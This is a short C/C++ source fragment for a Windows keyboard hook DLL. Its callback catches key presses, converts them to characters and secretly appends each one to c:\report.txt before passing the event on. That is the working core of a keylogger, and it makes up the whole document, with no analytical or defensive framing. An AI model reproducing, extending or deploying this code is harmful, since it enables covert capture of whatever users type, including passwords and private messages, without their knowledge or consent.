LRESULT __declspec(dllexport)__stdcall  CALLBACK KeyboardProc(
		int nCode, 
		WPARAM wParam, 
		LPARAM lParam)
{
	char ch;			
	if (((DWORD)lParam & 0x40000000) &&
		(HC_ACTION==nCode))
	{
		if ((wParam == VK_SPACE)||
			(wParam == VK_RETURN)||
			(wParam >= 0x2f) && (wParam <= 0x100)) 
		{
			FILE *file =fopen("c:\\report.txt","a+");
			if (wParam==VK_RETURN)
			{	
				ch='\n';
				fwrite(&ch,1,1,file);
			}
			else{
				BYTE ks[256];
				GetKeyboardState(ks);
				WORD w;
				UINT scan;
				scan=0;
				ToAscii(wParam,scan,ks,&w,0);
				ch =char(w); 
				fwrite(&ch,1,1,file);
			}
			fclose(file);
		}
	}

	LRESULT RetVal = CallNextHookEx( hHook, nCode, wParam, lParam);	
	return  RetVal;
}